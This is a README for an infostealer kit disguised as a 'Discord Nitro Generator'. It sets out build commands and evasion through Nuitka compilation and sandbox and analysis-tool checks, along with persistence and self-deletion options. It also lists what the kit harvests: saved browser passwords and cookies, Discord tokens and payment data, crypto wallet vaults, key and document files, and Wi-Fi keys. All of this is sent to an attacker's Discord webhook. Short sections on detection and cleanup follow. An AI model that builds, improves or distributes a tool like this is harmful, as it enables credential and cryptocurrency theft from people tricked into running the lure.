# nitro stealer

A fake "Discord Nitro Generator" that collects data from the host and ships it to a
Discord webhook. The window is the lure; collection starts at launch, independently of
whatever the user does with the window.

```
main.py            entry point: guard, delay, collect, zip, upload, repeat
lure.py            Nitro generator window (tkinter, Discord styling)
config.py          runtime settings, rewritten by builder.py
builder.py         writes config.py and builds a one-file exe
core/util.py       DPAPI, Chromium AES-GCM, staging area, zip, split
core/browsers.py   passwords and cookies from Chrome, Edge, Brave, Vivaldi, Opera
core/discord.py    token discovery, safeStorage decryption, profile and billing lookup
core/wallets.py    browser extension vaults and desktop wallet clients
core/files.py      documents and key material from user folders
core/screenshot.py GDI desktop capture, PNG encoder
core/sysinfo.py    host, network, privileges, Wi-Fi keys
core/guard.py      VM, sandbox and analysis-tool gates
core/upload.py     webhook delivery with automatic splitting
```

## Build

When running from source, copy `config.example.py` to `config.py` first. `builder.py`
writes `config.py` itself, and that file is gitignored because it holds a live webhook.

```powershell
pip install pycryptodome
pip install pyinstaller
python builder.py --webhook "https://discord.com/api/webhooks/ID/TOKEN" --build
```

Output: `dist/Nitro Generator.exe`. With `--nuitka` the same entry point is compiled to
C first, which removes the PyInstaller bootloader signature and most string-based
detections. Nuitka needs a C compiler; it downloads MinGW on first run.

```powershell
python builder.py --webhook "..." --build --nuitka --persist --delay 10
```

## Config

| Key | Default | Meaning |
|-----|---------|---------|
| `WEBHOOK` | empty | Discord webhook URL. No upload without it |
| `APP_NAME` | `NitroGen` | Folder and Run-key name when `PERSIST` is on |
| `DELAY_MINUTES` | 0 | Wait before the first upload, jittered 10% |
| `RETRY_MINUTES` | 30 | Gap between failed upload attempts (5 tries) |
| `REPEAT_HOURS` | 0 | Collect and upload again on this interval, 0 = once |
| `MAX_UPLOAD_MB` | 45 | Total staging budget, newest and most valuable files win |
| `CHUNK_MB` | 8 | Split the zip above this size, one webhook message per part |
| `GUARD` | on | Abort on sandbox indicators |
| `SILENT` | off | Skip the window entirely |
| `PERSIST` | off | Copy the exe to `%APPDATA%` and add an HKCU Run value |
| `SELF_DELETE` | off | Delete the exe after the last upload |

Every builder flag maps to one of these, so a build can be reproduced without opening
the source. `--config-only` rewrites `config.py` without compiling.

## Collected data

| Category | Source |
|----------|--------|
| `system` | host, user, OS, CPU, RAM, uptime, admin flag, LAN IP, MAC, screen, timezone, Wi-Fi keys, desktop screenshot |
| `browsers` | saved logins (origin, username, password) and session cookies for 26 domains, all profiles, Chrome/Edge/Brave/Vivaldi/Opera/Opera GX |
| `discord` | tokens from Discord, Canary, PTB and Development plus every browser profile, v10 safeStorage blobs decrypted, each token validated against `/users/@me`, profile and payment sources saved |
| `wallets` | MetaMask, Phantom, TronLink, Coinbase, Binance, Keplr, Yoroi, Nami, Rabby, Trust, Solflare, MathWallet; Exodus, Electrum, Atomic, Coinomi, Wasabi, Sparrow, Bitcoin, Litecoin, Dogecoin, Guarda |
| `documents` | pdf, doc(x), xls(x), ppt(x), csv, txt, rtf, odt/ods/odp plus `.kdbx`, `.key`, `.pem`, `.ppk`, `.ovpn`, `.rdp`, `.env`, `.wallet` and seed/recovery filenames; Desktop, Documents, Downloads, OneDrive, 3 levels deep, 400 files max |

Passwords are AES-GCM `v10`/`v11` decrypted with the key from each browser's
`Local State`, with a DPAPI fallback for old installs. `v20` app-bound blobs are skipped.
Firefox is not covered.

## Delivery

The staging folder is zipped, uploaded as `session.zip`, then deleted. Above `CHUNK_MB`
it is split into `session_001.zip`, `session_002.zip` and so on, one message each, about
one second apart to stay inside Discord's webhook rate limit. The first part carries the
summary embed: host, user, total size, file count, categories. Failed uploads retry five
times, then the archive is dropped.

`--delay 10` waits ten minutes; `--repeat 6` re-collects every six hours. With
`--persist`, the exe also starts at logon.

## Detection reality

There is no Python build that is reliably undetected, and this kit does not pretend
otherwise. What is in the box:

- `core/guard.py` exits on sub-10-minute uptime, under 1.5 GB RAM, known sandbox
  usernames and hostnames, debuggers, Sandboxie, small displays, and running analysis
  tools (`procmon`, `x64dbg`, `wireshark`, `fiddler`, VirtualBox and VMware helpers).
- Nuitka output avoids the PyInstaller stub that Defender signatures by name.
- No UPX, no packed resources, no base64 blobs in the source.

What still gets caught: unsigned binaries, `SetWindowsHookEx` if you reuse the keylogger,
`%APPDATA%` Run keys, and any outbound traffic to `discord.com/api/webhooks`. A webhook
URL is also a live IOC the moment Discord sees it. Code signing with a real certificate
is the only change that moves the needle on reputation, and it is not something a script
can provide.

## Cleanup

```powershell
Remove-Item "$env:APPDATA\NitroGen" -Recurse -Force
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v NitroGen /f
Get-Process | Where-Object { $_.Path -like "$env:APPDATA\NitroGen\*" } | Stop-Process -Force
```

Deleting the webhook stops all uploads immediately. `%TEMP%\ng_*.zip` can be left behind
if the process is killed mid-upload.
